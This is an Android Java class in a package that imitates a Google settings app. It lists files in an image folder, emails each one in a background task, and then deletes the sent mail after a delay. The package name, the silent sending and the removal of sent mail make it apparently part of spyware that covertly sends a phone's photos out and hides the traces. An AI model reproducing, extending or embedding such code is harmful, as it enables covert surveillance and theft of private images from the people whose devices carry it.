package com.setting.dl.google.googlesettings.mail;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.u;

import java.io.File;

/**
 * Created by hsyn on 28.09.2017.
 */

public class MailImageParts {
    
    private       String[] imageFiles;
    private final Context  context;
    
    
    public MailImageParts(Context context) {
        
        this.context = context;
        run();
    
    }
    
    private void run() {
        
        imageFiles = getImageParts();
    
        if (imageFiles == null || imageFiles.length < 1) {
            
            return;
        }
    
    
        new MakeRequestTask().execute();
        
    
    }
    
    
    @SuppressLint("StaticFieldLeak")
    private class MakeRequestTask extends AsyncTask<Void, Void, Void> {
    
    
        @Override
        protected Void doInBackground(Void... params) {
    
    
            for (final String fileName : imageFiles) {
                
                Log.i("MailImageParts", "image file : " + fileName);
    
                File file = new File(u.getImageFolder(context), fileName);
                
                String  body        = u.getDate(file.lastModified()) + "\n";
    
                Mail.sendImageFile(context, "image parts", body, file);
    
                u.run(() -> Mail.deleteAllSent(context), 10000);
            }
    
            
            return null;
        }
    
    }
    
    
            
            
    private String[] getImageParts() {
        
        File dir = new File(u.getImageFolder(context));
        
        String[] files = null;
        
        if (dir.exists()) {
            
            files = dir.list();
            
        }
        
        return files;
        
    }
}
